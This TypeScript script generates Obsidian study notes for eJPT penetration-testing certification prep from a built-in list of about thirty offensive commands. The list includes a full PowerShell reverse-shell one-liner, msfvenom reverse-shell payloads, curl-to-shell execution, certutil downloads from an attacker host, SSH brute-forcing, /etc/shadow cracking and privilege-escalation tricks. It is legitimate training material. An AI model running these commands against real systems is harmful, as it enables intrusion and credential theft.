import fs from 'fs';
import path from 'path';

const VAULT_ROOT = 'C:\\Users\\Zakar\\Documents\\Obsidian\\My_Vault';
const PAYLOADS_DIR = path.join(VAULT_ROOT, '01 Certifications', 'EJPT Certification', 'Payloads');

interface VaultPayloadNote {
  platform: 'Linux' | 'Windows' | 'Cross-Platform';
  category: string;
  filename: string;
  title: string;
  tool: string;
  command: string;
  description: string;
  howToUse: string;
  options: { flag: string; description: string }[];
  tags: string[];
}

const PAYLOAD_NOTES: VaultPayloadNote[] = [
  // ==========================================
  // LINUX PAYLOADS
  // ==========================================
  // 1. Recon & Network Scanning
  {
    platform: 'Linux',
    category: 'Recon & Network Scanning',
    filename: 'Nmap — Fast TCP SYN Scan Across All Ports.md',
    title: 'Nmap — Fast TCP SYN Scan Across All Ports',
    tool: 'nmap',
    command: 'nmap -sS -T4 -p- -oN all_ports.nmap <TARGET_IP>',
    description: 'Fast initial discovery scanning all 65,535 TCP ports without completing 3-way TCP handshakes.',
    howToUse: 'Run as the first command when engaging any target machine to discover non-standard high ports.',
    options: [
      { flag: '-sS', description: 'TCP SYN Stealth Scan' },
      { flag: '-T4', description: 'Aggressive timing template for fast network traversal' },
      { flag: '-p-', description: 'Scan all ports from 1 to 65535' },
      { flag: '-oN <FILE>', description: 'Output scan in normal text format' }
    ],
    tags: ['nmap', 'recon', 'portscan', 'syn', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Recon & Network Scanning',
    filename: 'Nmap — Service Version, OS & Default NSE Scripts.md',
    title: 'Nmap — Service Version, OS & Default NSE Scripts',
    tool: 'nmap',
    command: 'nmap -sC -sV -O -p <PORT> -oN detailed_scan.nmap <TARGET_IP>',
    description: 'Deep service probing on identified open ports to determine exact application versions, OS fingerprints, and default NSE scripts.',
    howToUse: 'Run after port discovery on specific open ports (e.g. 21,22,80,445) to gather versions for exploit search.',
    options: [
      { flag: '-sC', description: 'Run default safe NSE scripts' },
      { flag: '-sV', description: 'Probe open ports for service version banners' },
      { flag: '-O', description: 'Identify operating system version' },
      { flag: '-p <PORTS>', description: 'Specify comma-separated ports or ranges' }
    ],
    tags: ['nmap', 'recon', 'version', 'scripts', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Recon & Network Scanning',
    filename: 'ARP Scan — Local Subnet Discovery.md',
    title: 'ARP Scan — Local Subnet Discovery',
    tool: 'arp-scan',
    command: 'arp-scan --interface=<INTERFACE> --localnet',
    description: 'Layer 2 ARP broadcast discovery mapping all active IP addresses and MAC hardware vendors on the local network.',
    howToUse: 'Use when dropped into a new lab network segment to discover other live hosts.',
    options: [
      { flag: '--interface=<IFACE>', description: 'Specify network interface (e.g. eth0, tun0)' },
      { flag: '--localnet', description: 'Scan all IPv4 addresses in local subnet' }
    ],
    tags: ['arp-scan', 'recon', 'subnet', 'layer2', 'linux']
  },

  // 2. Host & Service Enumeration
  {
    platform: 'Linux',
    category: 'Host & Service Enumeration',
    filename: 'Enum4linux — Full Samba & SMB Enumeration.md',
    title: 'Enum4linux — Full Samba & SMB Enumeration',
    tool: 'enum4linux',
    command: 'enum4linux -a <TARGET_IP>',
    description: 'Automated SMB reconnaissance querying shares, user accounts, password policies, and domain groups.',
    howToUse: 'Run against any host running SMB (port 139/445) to discover usernames and shared folders.',
    options: [
      { flag: '-a', description: 'Do all basic enumeration (-U -S -G -P -r -o -n -i)' },
      { flag: '-U', description: 'Get userlist' },
      { flag: '-S', description: 'Get sharelist' },
      { flag: '-P', description: 'Get password policy' }
    ],
    tags: ['enum4linux', 'smb', 'samba', 'enumeration', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Host & Service Enumeration',
    filename: 'SMBClient — Anonymous Share Listing & Connection.md',
    title: 'SMBClient — Anonymous Share Listing & Connection',
    tool: 'smbclient',
    command: 'smbclient -L //<TARGET_IP>/ -N',
    description: 'Connects with a Null session (no password) to list all available SMB network shares and printers.',
    howToUse: 'Use to inspect shared folders. To connect directly: `smbclient //<TARGET_IP>/<SHARE> -N`.',
    options: [
      { flag: '-L //<IP>/', description: 'List hosted shares' },
      { flag: '-N', description: 'Suppress password prompt (null session)' }
    ],
    tags: ['smbclient', 'smb', 'shares', 'null-session', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Host & Service Enumeration',
    filename: 'SNMPWalk — MIB Community String Walk.md',
    title: 'SNMPWalk — MIB Community String Walk',
    tool: 'snmpwalk',
    command: 'snmpwalk -v2c -c <COMMUNITY> <TARGET_IP> 1.3.6.1.2.1.1',
    description: 'Enumerates system info, process list, network interfaces, and installed software via SNMP port 161 UDP.',
    howToUse: 'Probe with common community strings (`public`, `private`, `manager`) to dump system configurations.',
    options: [
      { flag: '-v2c', description: 'Use SNMP v2c protocol' },
      { flag: '-c <COMMUNITY>', description: 'Community string' }
    ],
    tags: ['snmpwalk', 'snmp', 'mib', 'udp', 'linux']
  },

  // 3. Web Application Pentesting
  {
    platform: 'Linux',
    category: 'Web Application Pentesting',
    filename: 'Gobuster — Directory & File Fuzzing.md',
    title: 'Gobuster — Directory & File Fuzzing',
    tool: 'gobuster',
    command: 'gobuster dir -u http://<TARGET_IP>:<PORT>/ -w <WORDLIST> -x php,txt,html,bak,json -t 30 -o gobuster_dirs.txt',
    description: 'Fast multithreaded directory and file fuzzing to locate hidden administrative panels and backups.',
    howToUse: 'Run against any HTTP/HTTPS service with appropriate extensions (`-x php,txt,html,bak`).',
    options: [
      { flag: 'dir', description: 'Directory fuzzing mode' },
      { flag: '-u <URL>', description: 'Target base URL' },
      { flag: '-w <PATH>', description: 'Wordlist dictionary path' },
      { flag: '-x <EXTS>', description: 'Comma-separated file extensions to append' },
      { flag: '-t <THREADS>', description: 'Number of worker threads (default 10, use 30)' }
    ],
    tags: ['gobuster', 'web', 'fuzzing', 'directory', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Web Application Pentesting',
    filename: 'FFUF — High-Performance Web Path Fuzzer.md',
    title: 'FFUF — High-Performance Web Path Fuzzer',
    tool: 'ffuf',
    command: 'ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w <WORDLIST> -mc 200,204,301,302,307,401,403 -c -o ffuf_results.json',
    description: 'Blazing-fast Go web fuzzer matching HTTP response status codes.',
    howToUse: 'Place `FUZZ` in any part of URL, headers, or body to mark the injection point.',
    options: [
      { flag: '-u <URL>', description: 'Target URL with FUZZ keyword' },
      { flag: '-w <PATH>', description: 'Wordlist path' },
      { flag: '-mc <CODES>', description: 'Match specific response codes' }
    ],
    tags: ['ffuf', 'web', 'fuzzing', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Web Application Pentesting',
    filename: 'SQLMap — Automated SQLi & Database Dumping.md',
    title: 'SQLMap — Automated SQLi & Database Dumping',
    tool: 'sqlmap',
    command: 'sqlmap -u "http://<TARGET_IP>:<PORT>/page.php?id=1" --batch --dbs --risk=3 --level=3',
    description: 'Automates detection and exploitation of SQL injection vulnerabilities to extract database tables and credentials.',
    howToUse: 'Supply URL with query parameter. Once database is identified, run `--dump -D <DB> -T <TABLE>` to extract data.',
    options: [
      { flag: '-u <URL>', description: 'Target URL with parameter' },
      { flag: '--batch', description: 'Non-interactive mode (use default responses)' },
      { flag: '--dbs', description: 'Enumerate DBMS databases' },
      { flag: '--dump', description: 'Dump database table entries' }
    ],
    tags: ['sqlmap', 'sqli', 'web', 'database', 'linux']
  },

  // 4. Exploitation & Metasploit
  {
    platform: 'Linux',
    category: 'Exploitation & Metasploit',
    filename: 'Searchsploit — Local Exploit-DB Lookups & Mirroring.md',
    title: 'Searchsploit — Local Exploit-DB Lookups & Mirroring',
    tool: 'searchsploit',
    command: 'searchsploit "<SERVICE_NAME>" <VERSION> --color -w',
    description: 'Searches local offline Exploit Database for known exploits matching exact banner versions.',
    howToUse: 'Use `-m <EDB_ID>` to copy the exploit script into your current working directory.',
    options: [
      { flag: '--color', description: 'Colorize output' },
      { flag: '-w', description: 'Display Exploit-DB URL' },
      { flag: '-m <ID>', description: 'Mirror exploit file locally' }
    ],
    tags: ['searchsploit', 'exploitdb', 'cve', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Exploitation & Metasploit',
    filename: 'MSFVenom — Linux ELF x64 Meterpreter Payload.md',
    title: 'MSFVenom — Linux ELF x64 Meterpreter Payload',
    tool: 'msfvenom',
    command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf',
    description: 'Generates a 64-bit Linux ELF reverse shell binary for target execution.',
    howToUse: 'Transfer to target, `chmod +x shell.elf`, and execute while handler is active.',
    options: [
      { flag: '-p linux/x64/meterpreter/reverse_tcp', description: 'Staged 64-bit Meterpreter payload' },
      { flag: 'LHOST=<IP>', description: 'Attacker listening IP' },
      { flag: 'LPORT=<PORT>', description: 'Attacker listening port' },
      { flag: '-f elf', description: 'Linux executable format' }
    ],
    tags: ['msfvenom', 'payload', 'linux', 'elf', 'meterpreter']
  },

  // 5. Password Cracking
  {
    platform: 'Linux',
    category: 'Password Cracking',
    filename: 'Hydra — Multi-Threaded SSH Password Brute-Force.md',
    title: 'Hydra — Multi-Threaded SSH Password Brute-Force',
    tool: 'hydra',
    command: 'hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET_IP>:<PORT> -t 4 -V -f -o ssh_cracked.txt',
    description: 'High-speed authentication attack against SSH service with early exit on first valid credential.',
    howToUse: 'Run against discovered SSH services when default credentials or wordlists are available.',
    options: [
      { flag: '-l <USER>', description: 'Single target username' },
      { flag: '-P <PASS_LIST>', description: 'Wordlist path' },
      { flag: '-t 4', description: 'Thread count (keep 4 for SSH)' },
      { flag: '-f', description: 'Exit upon finding first valid credential' }
    ],
    tags: ['hydra', 'ssh', 'password', 'bruteforce', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Password Cracking',
    filename: 'John the Ripper — Linux Shadow Hash Cracking.md',
    title: 'John the Ripper — Linux Shadow Hash Cracking',
    tool: 'john',
    command: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt && john --wordlist=<WORDLIST> unshadowed.txt',
    description: 'Combines Linux passwd and shadow hashes into a single file and cracks passwords with wordlist dictionary.',
    howToUse: 'Execute after reading `/etc/shadow` through root or high-privilege access.',
    options: [
      { flag: 'unshadow', description: 'Merges passwd and shadow files' },
      { flag: '--wordlist=<PATH>', description: 'Wordlist dictionary' }
    ],
    tags: ['john', 'shadow', 'password', 'hashes', 'linux']
  },

  // 6. Linux Privilege Escalation
  {
    platform: 'Linux',
    category: 'Privilege Escalation',
    filename: 'LinPEAS — In-Memory Linux Privilege Escalation Audit.md',
    title: 'LinPEAS — In-Memory Linux Privilege Escalation Audit',
    tool: 'linpeas',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    description: 'Automated script auditing SUID binaries, sudo permissions, cron jobs, passwords, and kernel CVEs.',
    howToUse: 'Run as soon as an initial low-privilege Linux shell is obtained.',
    options: [
      { flag: 'curl -L ... | sh', description: 'Pipes the official bash script into shell for memory execution' }
    ],
    tags: ['linpeas', 'privesc', 'linux', 'automation']
  },
  {
    platform: 'Linux',
    category: 'Privilege Escalation',
    filename: 'Sudo Rights & GTFOBins Privilege Escalation.md',
    title: 'Sudo Rights & GTFOBins Privilege Escalation',
    tool: 'sudo',
    command: 'sudo -l',
    description: 'Inspects all sudo privileges allowed for the current user without or with password.',
    howToUse: 'If a command like `(ALL) NOPASSWD: /usr/bin/find` is listed, look up the binary on GTFOBins for root shell.',
    options: [
      { flag: '-l', description: 'List allowed commands for current user' }
    ],
    tags: ['sudo', 'privesc', 'gtfobins', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Privilege Escalation',
    filename: 'SUID & SGID Binaries Discovery.md',
    title: 'SUID & SGID Binaries Discovery',
    tool: 'find',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    description: 'Scans the root filesystem for any file with SUID bit set, executing with root permissions.',
    howToUse: 'Check identified binaries against GTFOBins for instant privilege escalation.',
    options: [
      { flag: '-perm -u=s', description: 'Match files where user execution SUID bit (4000) is set' },
      { flag: '2>/dev/null', description: 'Suppress permission denied errors' }
    ],
    tags: ['find', 'suid', 'privesc', 'gtfobins', 'linux']
  },

  // 7. Pivoting & Listeners
  {
    platform: 'Linux',
    category: 'Pivoting & Listeners',
    filename: 'Chisel — Reverse SOCKS5 Tunneling.md',
    title: 'Chisel — Reverse SOCKS5 Tunneling',
    tool: 'chisel',
    command: 'chisel server -p <LPORT> --reverse',
    description: 'Starts a high-speed HTTP/WebSocket tunnel server on attacker host to receive reverse SOCKS proxy connections.',
    howToUse: 'On victim machine: `chisel client <LHOST>:<LPORT> R:1080:socks`. Then configure `proxychains4.conf` to port 1080.',
    options: [
      { flag: 'server', description: 'Run in server listener mode' },
      { flag: '-p <PORT>', description: 'Listening port' },
      { flag: '--reverse', description: 'Allow reverse client connections' }
    ],
    tags: ['chisel', 'pivoting', 'socks5', 'tunnel', 'linux']
  },
  {
    platform: 'Linux',
    category: 'Pivoting & Listeners',
    filename: 'Netcat & Socat — Reverse Shell Listeners.md',
    title: 'Netcat & Socat — Reverse Shell Listeners',
    tool: 'netcat',
    command: 'nc -lvnp <LPORT>',
    description: 'Standard TCP port listener awaiting incoming reverse shell connection from target machine.',
    howToUse: 'To stabilize with socat: `socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>`.',
    options: [
      { flag: '-l', description: 'Listen mode' },
      { flag: '-v', description: 'Verbose output' },
      { flag: '-n', description: 'Numeric-only IP' },
      { flag: '-p <PORT>', description: 'Port to listen on' }
    ],
    tags: ['netcat', 'socat', 'listener', 'reverse-shell', 'linux']
  },

  // ==========================================
  // WINDOWS PAYLOADS
  // ==========================================
  // 1. Recon & Enumeration
  {
    platform: 'Windows',
    category: 'Recon & Network Scanning',
    filename: 'Nmap — Windows Host Fingerprinting & RPC Scan.md',
    title: 'Nmap — Windows Host Fingerprinting & RPC Scan',
    tool: 'nmap',
    command: 'nmap -sS -sV -p 135,139,445,3389,5985,5986 -oN windows_scan.nmap <TARGET_IP>',
    description: 'Scans key Windows management and Active Directory ports (MSRPC, SMB, RDP, WinRM).',
    howToUse: 'Identifies Windows OS version, domain membership, and remote access protocols.',
    options: [
      { flag: '-p 135,139,445,3389,5985', description: 'Key Windows administration ports' }
    ],
    tags: ['nmap', 'windows', 'smb', 'rdp', 'winrm']
  },
  {
    platform: 'Windows',
    category: 'Host & Service Enumeration',
    filename: 'Windows SMB & Null Session Queries.md',
    title: 'Windows SMB & Null Session Queries',
    tool: 'smbclient',
    command: 'smbclient -L //<TARGET_IP>/ -U "%"',
    description: 'Queries Windows SMB service without credentials to list administrative and IPC shares.',
    howToUse: 'Look for `C$`, `ADMIN$`, `IPC$`, or custom departmental shares.',
    options: [
      { flag: '-U "%"', description: 'Connect with null password / anonymous token' }
    ],
    tags: ['smb', 'windows', 'shares', 'enumeration']
  },

  // 2. Windows Exploitation & Payloads
  {
    platform: 'Windows',
    category: 'Exploitation & Metasploit',
    filename: 'MSFVenom — Windows x64 Meterpreter Executable.md',
    title: 'MSFVenom — Windows x64 Meterpreter Executable',
    tool: 'msfvenom',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe',
    description: 'Generates a 64-bit Windows PE executable reverse shell for target delivery.',
    howToUse: 'Deliver via SMB share or web server, execute on target with interactive listener active.',
    options: [
      { flag: '-p windows/x64/meterpreter/reverse_tcp', description: 'Windows 64-bit staged Meterpreter' },
      { flag: '-f exe', description: 'PE executable format' }
    ],
    tags: ['msfvenom', 'windows', 'exe', 'payload']
  },
  {
    platform: 'Windows',
    category: 'Exploitation & Metasploit',
    filename: 'Windows PowerShell Reverse Shell One-Liner.md',
    title: 'Windows PowerShell Reverse Shell One-Liner',
    tool: 'powershell',
    command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'<LHOST>\',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    description: 'Native in-memory PowerShell TCP reverse shell without touching disk as an EXE.',
    howToUse: 'Paste directly into Windows command prompt or command injection parameter.',
    options: [
      { flag: '-NoP', description: 'No profile' },
      { flag: '-NonI', description: 'Non-interactive mode' },
      { flag: '-W Hidden', description: 'Hidden window' },
      { flag: '-Exec Bypass', description: 'Bypass execution policy restrictions' }
    ],
    tags: ['powershell', 'reverse-shell', 'windows', 'fileless']
  },

  // 3. Windows Privilege Escalation
  {
    platform: 'Windows',
    category: 'Privilege Escalation',
    filename: 'WinPEAS — Automated Windows Privilege Audit.md',
    title: 'WinPEAS — Automated Windows Privilege Audit',
    tool: 'winpeas',
    command: 'winpeas.exe quiet cmd',
    description: 'Audits Windows targets for unquoted service paths, AlwaysInstallElevated, Token privileges, and stored credentials.',
    howToUse: 'Download via `certutil -urlcache -f http://<LHOST>/winpeas.exe winpeas.exe` and execute.',
    options: [
      { flag: 'quiet', description: 'Suppress non-critical info' },
      { flag: 'cmd', description: 'Use CMD terminal colors' }
    ],
    tags: ['winpeas', 'privesc', 'windows', 'automation']
  },
  {
    platform: 'Windows',
    category: 'Privilege Escalation',
    filename: 'Token Privileges — SeImpersonate & Potato Exploits.md',
    title: 'Token Privileges — SeImpersonate & Potato Exploits',
    tool: 'whoami',
    command: 'whoami /priv',
    description: 'Checks if current user token possesses SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.',
    howToUse: 'If SeImpersonatePrivilege is enabled (e.g. IIS `iis apppool\\defaultapppool`), use JuicyPotatoNG or GodPotato for SYSTEM shell.',
    options: [
      { flag: '/priv', description: 'Display security privileges for user token' }
    ],
    tags: ['whoami', 'tokens', 'potato', 'privesc', 'windows']
  },
  {
    platform: 'Windows',
    category: 'Privilege Escalation',
    filename: 'Unquoted Service Paths & Weak Service Permissions.md',
    title: 'Unquoted Service Paths & Weak Service Permissions',
    tool: 'wmic',
    command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
    description: 'Finds third-party auto-starting Windows services with spaces in path and no quotation marks.',
    howToUse: 'If a path like `C:\\Program Files\\My App\\service.exe` exists and directory is writable, plant `C:\\Program.exe` to intercept execution on reboot.',
    options: [
      { flag: 'wmic service get', description: 'Query Windows Management Instrumentation service table' }
    ],
    tags: ['wmic', 'unquoted-path', 'services', 'windows', 'privesc']
  },
  {
    platform: 'Windows',
    category: 'Privilege Escalation',
    filename: 'AlwaysInstallElevated Registry Exploitation.md',
    title: 'AlwaysInstallElevated Registry Exploitation',
    tool: 'reg',
    command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    description: 'Checks if AlwaysInstallElevated is set to 1 in both HKCU and HKLM registries, allowing any MSI installer to run as SYSTEM.',
    howToUse: 'If both values equal `0x1`, generate MSI payload with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o install.msi` and run `msiexec /quiet /qn /i install.msi`.',
    options: [
      { flag: 'reg query', description: 'Query Windows registry key values' }
    ],
    tags: ['registry', 'alwaysinstallelevated', 'msi', 'windows', 'privesc']
  },
  {
    platform: 'Windows',
    category: 'Privilege Escalation',
    filename: 'Saved Windows Credentials (cmdkey).md',
    title: 'Saved Windows Credentials (cmdkey)',
    tool: 'cmdkey',
    command: 'cmdkey /list',
    description: 'Lists stored credentials in Windows Credential Manager.',
    howToUse: 'If credentials exist (e.g. for `Administrator`), execute commands as that user via `runas /savecred /user:Administrator "cmd.exe"`.',
    options: [
      { flag: '/list', description: 'List all stored credentials' }
    ],
    tags: ['cmdkey', 'credentials', 'runas', 'windows', 'privesc']
  },

  // 4. Password Attacks & Cracking
  {
    platform: 'Windows',
    category: 'Password Cracking',
    filename: 'Hashcat — Windows NTLM & NetNTLMv2 Cracking.md',
    title: 'Hashcat — Windows NTLM & NetNTLMv2 Cracking',
    tool: 'hashcat',
    command: 'hashcat -m 1000 -a 0 ntlm_hashes.txt <WORDLIST> -O',
    description: 'Uses GPU acceleration to crack Windows NTLM (mode 1000) or NetNTLMv2 (mode 5600) captured via Responder.',
    howToUse: 'Feed Responder or SAM database dump hashes into hashcat with rockyou.txt.',
    options: [
      { flag: '-m 1000', description: 'NTLM hash mode (use -m 5600 for NetNTLMv2)' },
      { flag: '-a 0', description: 'Dictionary attack mode' },
      { flag: '-O', description: 'Optimized GPU kernel' }
    ],
    tags: ['hashcat', 'ntlm', 'responder', 'windows', 'password']
  }
];

function generateMarkdownContent(note: VaultPayloadNote): string {
  const optionsTable = note.options && note.options.length > 0
    ? `
## ⚙️ Flags & Options Reference (--help Breakdown)
| Flag / Option | Description |
| :--- | :--- |
${note.options.map(o => `| \`${o.flag}\` | ${o.description} |`).join('\n')}
`
    : '';

  return `---
title: "${note.title}"
type: "leaf"
category: "${note.category}"
platform: "${note.platform}"
tool: "${note.tool}"
tier: 4
status: "active"
tags:
${note.tags.map(t => `  - ${t}`).join('\n')}
created: "${new Date().toISOString().split('T')[0]}"
updated: "${new Date().toISOString().split('T')[0]}"
parent: "[[01 Certifications/EJPT Certification/Payloads/📑 Payloads & Command Matrix — Master Index]]"
---

# ⚡ ${note.title}
**⬆️ Parent Hub:** [[01 Certifications/EJPT Certification/Payloads/📑 Payloads & Command Matrix — Master Index]]  
**💻 Platform:** \`${note.platform}\` | **🏷️ Category:** \`${note.category}\` | **🛠️ Tool:** \`${note.tool.toUpperCase()}\`

---

## 🎯 Payload Command Syntax
\`\`\`bash
${note.command}
\`\`\`

## 📝 Overview & Description
${note.description}

## 🛡️ eJPT Exam & Lab Execution Guidance
${note.howToUse}
${optionsTable}
---
*Synced live with Zak_OS Command Matrix & Second Brain.*
`;
}

export function populateVaultPayloads() {
  console.log(`[Vault Populator] Initializing write to: ${PAYLOADS_DIR}`);

  // Create base Payloads dir
  if (!fs.existsSync(PAYLOADS_DIR)) {
    fs.mkdirSync(PAYLOADS_DIR, { recursive: true });
  }

  // 1. Create Master Index Note
  const masterIndexPath = path.join(PAYLOADS_DIR, '📑 Payloads & Command Matrix — Master Index.md');
  const masterIndexContent = `---
title: "📑 Payloads & Command Matrix — Master Index"
type: "hub"
category: "Cybersecurity"
tier: 2
status: "active"
tags:
  - "ejpt"
  - "payloads"
  - "commands"
  - "master-index"
created: "${new Date().toISOString().split('T')[0]}"
updated: "${new Date().toISOString().split('T')[0]}"
parent: "[[01 Certifications/EJPT Certification/EJPT — Root Overview]]"
---

# 📑 Payloads & Command Matrix — Master Index
**⬆️ Parent:** [[01 Certifications/EJPT Certification/EJPT — Root Overview]]  
**🎯 Scope:** Complete eJPTv2 & Offensive Penetration Testing Payload Arsenal, systematically partitioned by OS Platform (\`Linux\` vs \`Windows\`) and Tactical Category.

---

## 🐧 Linux Payloads & Command Taxonomy
- **Recon & Network Scanning**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Recon & Network Scanning/Nmap — Fast TCP SYN Scan Across All Ports]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Recon & Network Scanning/Nmap — Service Version, OS & Default NSE Scripts]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Recon & Network Scanning/ARP Scan — Local Subnet Discovery]]
- **Host & Service Enumeration**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Host & Service Enumeration/Enum4linux — Full Samba & SMB Enumeration]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Host & Service Enumeration/SMBClient — Anonymous Share Listing & Connection]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Host & Service Enumeration/SNMPWalk — MIB Community String Walk]]
- **Web Application Pentesting**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Web Application Pentesting/Gobuster — Directory & File Fuzzing]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Web Application Pentesting/FFUF — High-Performance Web Path Fuzzer]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Web Application Pentesting/SQLMap — Automated SQLi & Database Dumping]]
- **Exploitation & Metasploit**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Exploitation & Metasploit/Searchsploit — Local Exploit-DB Lookups & Mirroring]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Exploitation & Metasploit/MSFVenom — Linux ELF x64 Meterpreter Payload]]
- **Password Cracking**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Password Cracking/Hydra — Multi-Threaded SSH Password Brute-Force]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Password Cracking/John the Ripper — Linux Shadow Hash Cracking]]
- **Privilege Escalation**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Privilege Escalation/LinPEAS — In-Memory Linux Privilege Escalation Audit]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Privilege Escalation/Sudo Rights & GTFOBins Privilege Escalation]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Privilege Escalation/SUID & SGID Binaries Discovery]]
- **Pivoting & Listeners**:
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Pivoting & Listeners/Chisel — Reverse SOCKS5 Tunneling]]
  - [[01 Certifications/EJPT Certification/Payloads/Linux/Pivoting & Listeners/Netcat & Socat — Reverse Shell Listeners]]

---

## 🪟 Windows Payloads & Command Taxonomy
- **Recon & Network Scanning**:
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Recon & Network Scanning/Nmap — Windows Host Fingerprinting & RPC Scan]]
- **Host & Service Enumeration**:
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Host & Service Enumeration/Windows SMB & Null Session Queries]]
- **Exploitation & Metasploit**:
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Exploitation & Metasploit/MSFVenom — Windows x64 Meterpreter Executable]]
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Exploitation & Metasploit/Windows PowerShell Reverse Shell One-Liner]]
- **Privilege Escalation**:
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Privilege Escalation/WinPEAS — Automated Windows Privilege Audit]]
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Privilege Escalation/Token Privileges — SeImpersonate & Potato Exploits]]
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Privilege Escalation/Unquoted Service Paths & Weak Service Permissions]]
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Privilege Escalation/AlwaysInstallElevated Registry Exploitation]]
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Privilege Escalation/Saved Windows Credentials (cmdkey)]]
- **Password Cracking**:
  - [[01 Certifications/EJPT Certification/Payloads/Windows/Password Cracking/Hashcat — Windows NTLM & NetNTLMv2 Cracking]]
`;

  fs.writeFileSync(masterIndexPath, masterIndexContent, 'utf-8');
  console.log(`[Vault Populator] Created master index note.`);

  // 2. Create Platform Subfolders and Payload Markdown Notes
  let createdCount = 0;
  for (const note of PAYLOAD_NOTES) {
    const targetFolder = path.join(PAYLOADS_DIR, note.platform, note.category);
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder, { recursive: true });
    }

    const filePath = path.join(targetFolder, note.filename);
    const content = generateMarkdownContent(note);
    fs.writeFileSync(filePath, content, 'utf-8');
    createdCount++;
  }

  console.log(`[Vault Populator] Successfully created and indexed ${createdCount} structured markdown payload notes into Obsidian!`);
}

// Execute
populateVaultPayloads();
